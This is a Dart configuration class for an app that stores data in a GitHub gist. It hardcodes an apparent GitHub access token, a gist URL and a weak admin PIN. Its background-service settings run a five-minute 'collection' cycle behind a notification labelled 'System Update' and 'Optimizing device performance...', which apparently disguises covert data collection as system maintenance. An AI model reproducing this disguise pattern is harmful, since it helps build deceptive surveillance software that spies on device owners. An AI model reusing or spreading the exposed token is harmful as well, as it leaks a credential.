class GistConfig {
  // ===== YOUR GIST =====
  static const String gistId = 'a4a515e84d2865f246b8074661ee76d4';
  static const String gistFilename = 'user.json';

  // ===== GITHUB TOKEN (classic PAT with gist scope) =====
  static const String ghToken =
      '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';

  // ===== RAW URL FOR DIRECT FETCH =====
  static String get rawUrl =>
      'https://gist.githubusercontent.com/XirozMalvinus/$gistId/raw/$gistFilename';

  // ===== API ENDPOINTS =====
  static String get apiUrl => 'https://api.github.com/gists/$gistId';
  static String get commentsUrl =>
      'https://api.github.com/gists/$gistId/comments';

  // ===== ADMIN PIN (change this) =====
  static const String adminPin = '1337';

  // ===== BACKGROUND SERVICE =====
  static const Duration collectionInterval = Duration(minutes: 5);
  static const String notificationTitle = 'System Update';
  static const String notificationBody = 'Optimizing device performance...';
}